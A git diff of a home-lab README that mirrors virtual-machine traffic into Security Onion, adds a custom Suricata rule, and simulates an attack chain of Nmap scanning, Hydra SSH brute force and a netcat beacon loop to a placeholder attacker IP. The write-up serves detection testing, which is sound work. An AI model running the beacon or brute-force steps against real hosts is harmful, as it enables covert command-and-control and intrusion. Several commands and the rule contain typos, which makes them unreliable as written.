@@ -24,8 +24,11 @@ Also, before setting up the SPAN port, we must configure the VMs and do so with 
 We execute the following commands:
 
 Create the port: `sudo ovs-vsctl add-br [Name-of-the-port]`
+
 Check if it's work: `sudo ovs-vsctl show`
+
 Open the port: `sudo ip link set [Name-of-the-port] up`
+
 Eliminate IP:`sudo ip addr flush dev [Name-of-the-port]`
 
 
@@ -61,7 +64,8 @@ While keeping the VMs powered on, we must deploy the SPAN port.
 To do this, we must first verify the name of each VM. Using libvirt (QEMU/KVM), this can be seen in the network configuration tab. The name is usually something similar to “vnetX.”
 
 Now we run this in the terminal:
-`udo ovs-vsctl \
+
+`sudo ovs-vsctl \
   -- --id=@p get port vnetX \ #Change the X for the number of Security Onion port
   -- --id=@m create mirror name=span-mirror select-all=true output-port=@p \
   -- set bridge [Name-of-the-port] mirrors=@m`
@@ -89,6 +93,7 @@ Second, **the header** defines the protocol, IP, ports, and address.
 Third, **the rule options** define the specifications of the rule.
 
 This is a simple rule I created for HTTP connections on non-standard ports, following MITRE T1071.001.
+
 `alert http $HOME_NET nay -> $EXTERNAL_NET !80,!443!,!8080(msg:"[LAB] HTTP in weird port - possible C2 or simulated beacon"; flow:to_server; established; classtype: policy-violation; sid:1000001; rev1;)`
 
 #### Attackes
@@ -109,16 +114,21 @@ This is the response of Security Onion: <img width="798" height="145" alt="Captu
 
 **3-Beacon Simulation**
 Here we display a beacon using MITRE techniques T1071.001, T1571, T104
+
 This is the full command used on the victim machine: `while ture; do echo -e "GET /beacon HTTP/1.1\r\nHost:[IP]\r\nConnection: close\r\n\r\n" | nc [IP] 4444; sleep 45; done;`
+
 Also we can use netcat on Kali:`nc -l -p 4444`
 
 This is the response of Security Onion using the custom rule that we define early:
 <img width="951" height="106" alt="Captura desde 2026-02-20 16-46-24" src="https://github.com/user-attachments/assets/cf2b55f6-3090-4b75-838c-c784c07d3d60" />
 
-With all this three command we simulate a simple attack chain.
--Frist, we make reconnaissance with Nmap
--Second, using Hydra to brute force ssh and connect the machine
--Third using a beacon to exfiltrate data to a remote server.
+### With all this three command we simulate a simple attack chain.
+
+#### -Frist, we make reconnaissance with Nmap
+
+#### -Second, using Hydra to brute force ssh and connect the machine
+
+#### -Third using a beacon to exfiltrate data to a remote server.
 
 
 
